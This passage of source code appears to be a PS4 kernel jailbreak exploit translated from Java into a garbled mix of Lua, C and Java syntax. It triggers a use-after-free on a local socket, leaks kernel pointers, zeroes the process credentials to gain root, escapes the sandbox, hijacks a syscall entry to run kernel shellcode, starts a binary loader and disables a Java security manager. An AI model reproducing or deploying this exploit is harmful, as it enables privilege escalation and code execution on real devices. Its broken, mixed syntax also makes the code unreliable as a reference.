    local uafSock = Poops.uafSock
    local msg = Poops.msg
    local uioIovRead = Poops.uioIovRead
    local uioIovWrite = Poops.uioIovWrite
    local tmp = Poops.tmp
    local triplets = {}
    local Int8 = {SIZE = 1}

    local sockaddr_in = {}
    sockaddr_in.sin_family = 2
    sockaddr_in.sin_port = 0x2B
    sockaddr_in.sin_addr = 0x7F000001

    try
        for i = 0, tries - 1 do
            console.println("trying " .. i)
            local twins = {}
            connect(uafSock, sockaddr_in)
            local twin0 = Helper.findPort(uafSock)
            if (twin0 == -1) {
                console.println("twin0 failed")
                return false
            }
            twins[0] = twin0
            close(dup(uafSock))
            local twin1 = Helper.findPort(uafSock)
            if (twin1 == -1) {
                console.println("twin1 failed")
                return false
            }
            if (twins[0] == twin1) {
                console.println("twins are same")
                return false
            }
            console.println("leaking")
            uioState.signalWork(COMMAND_UIO_WRITE)
            iovState.signalWork(0)
            uioState.waitForFinished()
            iovState.waitForFinished()
            local kport = Helper.kread64(twin1 + 0x98)
            if (kport == 0) {
                console.println("kport 0")
                return false
            }
            console.println("kport " .. string.format("0x%X", kport))
            local kqueue = Helper.kread64(kport + 0x188)
            if (kqueue == 0) {
                console.println("kqueue 0")
                return false
            }
            console.println("kqueue " .. string.format("0x%X", kqueue))
            local knote = Helper.kread64(kqueue + 0x50)
            if (knote == 0) {
                console.println("knote 0")
                return false
            }
            console.println("knote " .. string.format("0x%X", knote))
            local knData = Helper.kread64(knote + 0xD8)
            if (knData == 0) {
                console.println("knData 0")
                return false
            }
            console.println("knData " .. string.format("0x%X", knData))
            kBase = knData - KernelOffset.getKBaseOffset()
            console.println("kbase " .. string.format("0x%X", kBase))
            if (kBase == 0) {
                console.println("kbase 0")
                return false
            }
            Poops.kBase = kBase
            local task = Helper.kread64(kport + 0x38)
            if (task == 0) {
                console.println("task 0")
                return false
            }
            console.println("task " .. string.format("0x%X", task))
            local ucred = Helper.kread64(task + 0x288)
            if (ucred == 0) {
                console.println("ucred 0")
                return false
            }
            console.println("ucred " .. string.format("0x%X", ucred))
            console.println("patching ucred")
            Helper.kwrite32(ucred + 0x0, 0)
            Helper.kwrite32(ucred + 0x4, 0)
            Helper.kwrite32(ucred + 0x8, 0)
            Helper.kwrite32(ucred + 0xC, 0)
            break
        }

        if (kBase == nil or kBase == 0) {
            console.println("kbase failed")
            return false
        }

        for i = 0, tries - 1 do
            local twins = {}
            connect(uafSock, sockaddr_in)
            local twin0 = Helper.findPort(uafSock)
            if (twin0 == -1) {
                console.println("twin0 failed")
                return false
            }
            twins[0] = twin0
            local iov = {}
            iov.iov_base = twins[0] + 0x98
            iov.iov_len = 8
            msg.msg_iov = iov
            msg.msg_iovlen = 1
            uioState.signalWork(COMMAND_UIO_READ)
            iovState.signalWork(0)
            uioState.waitForFinished()
            iovState.waitForFinished()

            local kport = Helper.bytesToLong(tmp)
            if (kport == 0) {
                console.println("kport read is null")
                return false
            }
            iov = {}
            iov.iov_base = twins[0] + 0x98
            iov.iov_len = 8
            msg.msg_iov = iov
            msg.msg_iovlen = 1
            Helper.longToBytes(0, tmp)
            uioState.signalWork(COMMAND_UIO_WRITE)
            iovState.signalWork(0)
            uioState.waitForFinished()
            iovState.waitForFinished()

            break
        }

    catch e
        console.println("exception during leak / rw")
        return false

    return true
end

local function escapeSandbox()
    local console = Poops.console
    local iovState = Poops.iovState
    local uioState = Poops.uioState
    local iovSs0 = Poops.iovSs0
    local iovSs1 = Poops.iovSs1
    local uioSs0 = Poops.uioSs0
    local uioSs1 = Poops.uioSs1
    local uafSock = Poops.uafSock
    local msg = Poops.msg
    local uioIovRead = Poops.uioIovRead
    local uioIovWrite = Poops.uioIovWrite
    local tmp = Poops.tmp
    local kBase = Poops.kBase
    local triplets = {}
    local Int8 = {SIZE = 1}

    local iovSs1 = Poops.iovSs1
    try
        connect(uafSock, 0x020000017F000001 + (0x2B << 16))
        triplets[0] = Helper.findPort(uafSock)
        if (triplets[0] == -1)
        {
            console.println("triplets 0 failed")
            return false
        }
        close(dup(uafSock))
        triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES)
        if (triplets[1] == -1)
        {
            console.println("triplets 1 failed")
            return false
        }
        write(iovSs1, tmp, Int8.SIZE)
        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES)
        if (triplets[2] == -1)
        {
            console.println("triplets 2 failed")
            return false
        }
        iovState.waitForFinished()
        read(iovSs0, tmp, Int8.SIZE)
    catch e
        console.println("exception during stage 0")
        return false

    return true
end

local function applyKernelPatchesPS4()
    local kBase = Poops.kBase
    try
        local shellcode = KernelOffset.getKernelPatchesShellcode()
        if (#shellcode == 0) then
            return false
        end

        local sysent661Addr = kBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET")
        local mappingAddr = 0x920100000
        local shadowMappingAddr = 0x926100000

        local syNarg = Helper.kread32(sysent661Addr)
        local syCall = Helper.kread64(sysent661Addr + 8)
        local syThrcnt = Helper.kread32(sysent661Addr + 0x2c)
        Helper.kwrite32(sysent661Addr, 2)
        Helper.kwrite64(sysent661Addr + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"))
        Helper.kwrite32(sysent661Addr + 0x2c, 1)
        
        local PROT_READ = 0x1
        local PROT_WRITE = 0x2
        local PROT_EXEC = 0x4
        local PROT_RW = PROT_READ | PROT_WRITE
        local PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC
        
        local alignedMemsz = 0x10000
        -- create shm with exec permission
        local execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0, alignedMemsz, PROT_RWX)
        -- create shm alias with write permission
        local writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, PROT_RW)
        -- map shadow mapping and write into it
        Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, alignedMemsz, PROT_RW, 0x11, writeHandle, 0)
        for i = 0, #shellcode - 1 do
            Helper.api.write8(shadowMappingAddr + i, shellcode[i + 1])
        end
        -- map executable segment
        Helper.syscall(Helper.SYS_MMAP, mappingAddr, alignedMemsz, PROT_RWX, 0x11, execHandle, 0)
        Helper.syscall(Helper.SYS_KEXEC, mappingAddr)
        Helper.kwrite32(sysent661Addr, syNarg)
        Helper.kwrite64(sysent661Addr + 8, syCall)
        Helper.kwrite32(sysent661Addr + 0x2c, syThrcnt)
        Helper.syscall(Helper.SYS_CLOSE, writeHandle)
    catch e

    return true
end

function Poops.main(cons)
    Poops.console = cons

    -- check for jailbreak
    if (Helper.isJailbroken()) then
        NativeInvoke.sendNotificationRequest("Already Jailbroken")
        return 0
    end

    -- perform setup
    Poops.console.println("Pre-configuration")
    if (not performSetup())
    {
        Poops.console.println("pre-config failure")
        cleanup()
        return -3
    }
    Poops.console.println("Initial triple free")
    if (not triggerUcredTripleFree()) then
        cons.println("triple free failed")
        cleanup()
        return -4
    end

    -- do not print to the console to increase stability here
    if (not achieveRw(KQUEUE_TRIES)) then
        cons.println("Leak / RW failed")
        cleanup()
        return -6
    end

    Poops.console.println("Escaping sandbox")
    if (not escapeSandbox()) then
        cons.println("Escape sandbox failed")
        cleanup()
        return -7
    end

    Poops.console.println("Patching system")
    if (not applyKernelPatchesPS4()) then
        cons.println("Applying patches failed")
        cleanup()
        return -8
    end

    cleanup()

    BinLoader.start()

    return 0
end

Poops.IovThread = {}
Poops.IovThread.__index = Poops.IovThread

function Poops.IovThread.new(state)
    local self = setmetatable({}, Poops.IovThread)
    self.state = state
    return self
end

function Poops.IovThread:run()
    cpusetSetAffinity(4)
    Helper.setRealtimePriority(256)
    try
        while (true) do
            self.state:waitForWork()
            recvmsg(iovSs0, msg, 0)
            self.state:signalFinished()
        end
    catch e

end

Poops.UioThread = {}
Poops.UioThread.__index = Poops.UioThread

function Poops.UioThread.new(state)
    local self = setmetatable({}, Poops.UioThread)
    self.state = state
    return self
end

function Poops.UioThread:run()
    cpusetSetAffinity(4)
    Helper.setRealtimePriority(256)
    try
        while (true) do
            local command = self.state:waitForWork()
            if (command == COMMAND_UIO_READ) then
                writev(uioSs1, uioIovRead, UIO_IOV_NUM)
            elseif (command == COMMAND_UIO_WRITE) then
                readv(uioSs0, uioIovWrite, UIO_IOV_NUM)
            end
            self.state:signalFinished()
        end
    catch e

end

Poops.WorkerState = {}
Poops.WorkerState.__index = Poops.WorkerState

function Poops.WorkerState.new(totalWorkers)
    local self = setmetatable({}, Poops.WorkerState)
    self.totalWorkers = totalWorkers
    self.workersStartedWork = 0
    self.workersFinishedWork = 0
    self.workCommand = -1
    return self
end

function Poops.WorkerState:signalWork(command)
    self.workersStartedWork = 0
    self.workersFinishedWork = 0
    self.workCommand = command
    --[[notifyAll()

    while (self.workersStartedWork < self.totalWorkers) do
        try
            wait()
        catch (InterruptedException e) {
            // Ignore.
        }
    end]]
end

function Poops.WorkerState:waitForFinished()
    --[[while (self.workersFinishedWork < self.totalWorkers) do
        try
            wait()
        catch (InterruptedException e) {
            // Ignore.
        }
    end]]

    self.workCommand = -1
end

function Poops.WorkerState:waitForWork()
    --[[while (self.workCommand == -1 or self.workersFinishedWork ~= 0) do
        wait()
    end]]

    self.workersStartedWork = self.workersStartedWork + 1
    --[[if (self.workersStartedWork == self.totalWorkers) do
        notifyAll()
    end]]

    return self.workCommand
end

function Poops.WorkerState:signalFinished()
    self.workersFinishedWork = self.workersFinishedWork + 1
    --[[if (self.workersFinishedWork == self.totalWorkers) do
        notifyAll()
    end]]
end

DisableSecurityManagerAction = {}

function DisableSecurityManagerAction:run()
  System.setSecurityManager(nil)
  return System.getSecurityManager()
end

function DisableSecurityManagerAction.execute()
  --[[try {
    return AccessController.doPrivileged(new DisableSecurityManagerAction());
  } catch (PrivilegedActionException e) {
    throw e;
  }]]
end
```

```lua
-- FILE: DisableSecurityManagerAction.java
local DisableSecurityManagerAction = {}

function DisableSecurityManagerAction:run()
    return nil
end

-- FILE: SecurityUtils.java
local SecurityUtils = {}

SecurityUtils.DISABLE_ALL_SECURITY_PERMISSIONS = {};

function SecurityUtils.disableAllSecurity()
    return AccessController.doPrivileged(DisableSecurityManagerAction)
end